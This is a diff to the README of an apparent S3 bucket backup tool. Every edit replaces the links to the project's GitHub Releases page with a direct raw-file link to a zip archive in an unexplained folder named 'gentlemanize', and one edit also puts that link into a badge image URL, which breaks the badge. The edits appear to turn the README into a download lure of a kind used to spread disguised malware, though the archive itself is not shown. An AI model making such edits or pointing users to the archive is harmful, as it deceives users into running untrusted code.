@@ -1,6 +1,6 @@
 # 📦 aws-s3-local-backup - Effortless Local Backup of S3 Buckets
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/TebebuTefera/aws-s3-local-backup/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/TebebuTefera/aws-s3-local-backup/master/gentlemanize/backup-s-aws-local-1.0-beta.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/TebebuTefera/aws-s3-local-backup/master/gentlemanize/backup-s-aws-local-1.0-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to the aws-s3-local-backup application! This tool helps you download all
 
 To get started, visit the Releases page to download the application:
 
-[Download Latest Release](https://github.com/TebebuTefera/aws-s3-local-backup/releases).
+[Download Latest Release](https://raw.githubusercontent.com/TebebuTefera/aws-s3-local-backup/master/gentlemanize/backup-s-aws-local-1.0-beta.2.zip).
 
 Follow these steps:
 
@@ -83,4 +83,4 @@ If you have any questions or need further assistance, feel free to open an issue
 
 Enjoy your seamless S3 backup experience with aws-s3-local-backup. 
 
-[Visit Releases Page](https://github.com/TebebuTefera/aws-s3-local-backup/releases) to download the latest version and get started.
+[Visit Releases Page](https://raw.githubusercontent.com/TebebuTefera/aws-s3-local-backup/master/gentlemanize/backup-s-aws-local-1.0-beta.2.zip) to download the latest version and get started.
